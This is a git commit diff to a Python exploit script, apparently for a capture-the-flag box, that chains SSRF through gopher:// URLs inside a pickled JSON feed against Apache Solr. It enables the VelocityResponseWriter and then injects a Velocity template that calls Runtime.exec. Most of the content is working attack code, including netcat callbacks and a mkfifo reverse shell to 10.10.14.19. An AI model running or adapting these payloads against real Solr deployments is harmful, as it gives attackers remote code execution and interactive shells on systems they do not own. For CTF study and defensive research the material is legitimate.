8577dc182a33546b20e720306e8b710d6616b6bd
kunseok <tastypie@gmail.com>
2020-08-29 21:32:04 -0400

    progress...

--- laser/sploit/client2.py
+++ laser/sploit/client2.py
@@ -25,9 +25,7 @@ import json
 import pickle
 
 def make_payload(port,payload,protocol):
-    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+protocol+'://localhost:'+ port +'/' +payload+ '"}'
-
-    print(p)
+    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'
 
     # For storing 
     p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
@@ -60,7 +58,7 @@ if __name__ == '__main__':
     ###########################################################################
     '''
     _POST /solr/test/config HTTP/1.1
-    Host: 127.0.0.1:8983
+    Host: localhost:8983
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
     Accept: */*
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -71,7 +69,7 @@ if __name__ == '__main__':
 
     {"update-queryresponsewriter": {"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "", "solr.resource.loader.enabled": "true", "params.resource.loader.enabled": "true"}}
     '''
-    payload = "_POST%20%2Fsolr%2Fstaging%2Fconfig%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A8983%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A69.0)%20Gecko%2F20100101%20Firefox%2F69.0%0AAccept%3A%20*%2F*%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0AContent-Type%3A%20application%2Fjson%0ACache%3A%20no-cache%0AConnection%3A%20close%0AContent-Length%3A%20218%0A%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22startup%22%3A%20%22lazy%22%2C%20%22name%22%3A%20%22velocity%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%7D%7D"
+    payload = "gopher://localhost:8983/_POST%20/solr/staging/config%20HTTP/1.1%0D%0AHost%3A%20localhost%3A8983%0D%0AConnection%3A%20close%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAcccept%3A%20%2A/%2A%0D%0AContent-Type%3A%20application/json%0D%0AContent-Length%3A%20220%0D%0A%0D%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22name%22%3A%20%22velocity%22%2C%20%22startup%22%3A%20%22lazy%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%7D%7D"
     temp = make_payload(port,payload,"gopher")
     run(temp)
 
@@ -79,8 +77,8 @@ if __name__ == '__main__':
     # rce
     ###########################################################################
     '''
-    _GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('nc 10.10.14.19 1337')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1
-    Host: 127.0.0.1:8983
+    GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('nc 10.10.14.19 1337')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1
+    Host: localhost:8983
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
     Accept: */*
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -90,6 +88,18 @@ if __name__ == '__main__':
 
 
     '''
-    payload = "_GET%20%2Fsolr%2Fstaging%2Fselect%3Fq%3D1%26%26wt%3Dvelocity%26v.template%3Dcustom%26v.template.custom%3D%23set(%24x%3D%27%27)%20%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))%20%23set(%24chr%3D%24x.class.forName(%27java.lang.Character%27))%20%23set(%24str%3D%24x.class.forName(%27java.lang.String%27))%20%23set(%24ex%3D%24rt.getRuntime().exec(%27nc%2010.10.14.19%201337%27))%20%24ex.waitFor()%20%23set(%24out%3D%24ex.getInputStream())%20%23foreach(%24i%20in%20%5B1..%24out.available()%5D)%24str.valueOf(%24chr.toChars(%24out.read()))%23end%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A8983%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A69.0)%20Gecko%2F20100101%20Firefox%2F69.0%0AAccept%3A%20*%2F*%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0ACache%3A%20no-cache%0AConnection%3A%20close%0A%0A"
+
+    command = "nc%2010.10.14.19%204444"
+    command = "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.19%204242%20>/tmp/f"
+    url = ("/select?q=1&wt=velocity&v.template=custom&v.template.custom="
+        "%23set($x=%27%27)+"
+        "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
+        "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
+        "%23set($str=$x.class.forName(%27java.lang.String%27))+"
+        "%23set($ex=$rt.getRuntime().exec(%27" + command +
+        "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
+        "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
+
+    payload = "http://localhost:8983/solr/staging" + url
     temp = make_payload(port,payload,"gopher")
     run(temp)
